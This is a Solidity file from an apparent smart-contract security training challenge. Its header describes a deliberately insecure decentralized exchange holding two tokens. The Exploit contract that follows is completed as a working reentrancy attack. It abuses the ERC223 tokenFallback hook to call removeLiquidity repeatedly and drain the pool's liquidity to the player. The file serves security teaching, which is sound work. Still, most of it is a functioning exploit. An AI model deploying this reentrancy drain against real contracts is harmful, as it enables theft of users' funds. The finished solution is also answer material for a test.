// SPDX-License-Identifier: MIT

/*

Welcome to Challenge 2!

This file contains the challege's Exploit contract which you will have to complete.

=====================================================================

I bet you are familiar with **decentralized exchanges**:
a magical place where one can exchange different tokens.
`InsecureDexLP` is exactly that: a very insecure Uniswap-kind-of
decentralized exchange.
Recently, the $ISEC token got listed in this dex and can be traded
against a not-so-popular token called $SET.

ðŸ“Œ Upon deployment, the `InSecureumToken` and `SimpleERC223Token` contracts
mint an initial supply of tokens 10 $ISEC and 10 $SET to
the contract deployer.

ðŸ“Œ The `InsecureDexLP` operates with $ISEC and $SET.

ðŸ“Œ The dex has an initial liquidity of 9 $ISEC and 9 $SET,
provided by the contract deployer. This quantity can be increased by anyone
through token deposits.

ðŸ“Œ Adding liquidity to the dex rewards liquidity pool tokens (LP tokens),
which can be redeemed in any moment for the original funds.

ðŸ“Œ The challenger (you!) calls the exclusive `claimAirdrop()`
functions of each of the token contracts, obtaining this way
1 $ISEC and 1 $SET (already done in the `script.js` file).

Will you be able to drain `InsecureDexLP`'s $ISEC/$SET liquidity? ðŸ˜ˆðŸ˜ˆðŸ˜ˆ
*/

/*///////////////////////////////////////////////////////////////////
//                                                                 //
//                           DEPENDENCIES                          //
//                                                                 //
///////////////////////////////////////////////////////////////////*/

/*
 * To solve this challenge, you will need some interfaces.
 * We kindly provide them below :)
 */
pragma solidity ^0.8.13;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface InsecureDexLP {
    function addLiquidity(uint256 amount0, uint256 amount1) external;
    function balanceOf(address user) external view returns(uint256);
    function removeLiquidity(
        uint256 amount
    ) external returns(uint amount0, uint amount1);
    function swap(
        address tokenFrom,
        address tokenTo,
        uint256 amountIn
    ) external returns(uint256 amountOut);
    function token0() external returns(IERC20);
    function token1() external returns(IERC20);
}


/*///////////////////////////////////////////////////////////////////
//                                                                 //
//                         EXPLOIT CONTRACT                        //
//                                                                 //
///////////////////////////////////////////////////////////////////*/

/*
 * Complete the contract below so that you steal all the $ISECs and $SETs!
 * Note that you can also modify the `Deploy Exploit Contracts` section
 * of `script.js` as needed by your Exploit implementation.
 *
 * Note: we already completed a tiny part of the contract for you! :)
 */

contract Exploit {
    IERC20 public token0; // this is insecureumToken
    IERC20 public token1; // this is simpleERC223Token
    InsecureDexLP public dex;

    bool private hacking;
    uint public num_reentered;
    address private _player;

    constructor(address _dexAddress) {    
        _player = msg.sender;
        dex = InsecureDexLP(_dexAddress);
        token0 = IERC20(dex.token0());
        token1 = IERC20(dex.token1());

        token1.approve(_dexAddress, type(uint256).max);
        token0.approve(_dexAddress, type(uint256).max);
    }

    function hack() public {
        uint256 token0Balance = token0.balanceOf(_player);
        uint256 token1Balance = token1.balanceOf(_player);

        token0.transferFrom(_player, address(this), token0Balance);
        token1.transferFrom(_player, address(this), token1Balance);

        dex.addLiquidity(token0Balance, token1Balance);

        hacking = true;
        dex.removeLiquidity(dex.balanceOf(address(this)));
        hacking = false;
    }

    function tokenFallback(address _sender, uint256 value, bytes memory data) external {
        if (!hacking) {
            return;
        }

        if (num_reentered > 8) {
            uint256 token0Balance = token0.balanceOf(address(this));
            uint256 token1Balance = token1.balanceOf(address(this));
            token0.transfer(_player, token0Balance);
            token1.transfer(_player, token1Balance);
            return;
        }
        ++num_reentered;
        dex.removeLiquidity(dex.balanceOf(address(this)));

    }
}